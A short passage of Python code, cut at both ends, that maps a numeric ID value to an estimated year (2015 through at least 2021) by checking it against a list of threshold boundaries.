            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        for upper, year in ranges:
            if hy <= upper:
                return year
        if hy > 21254029834:
            if hy <= 30577684866:
                return 2020
            elif hy <= 48009087498:
                return 2021
            elif hy <= 51994527687:
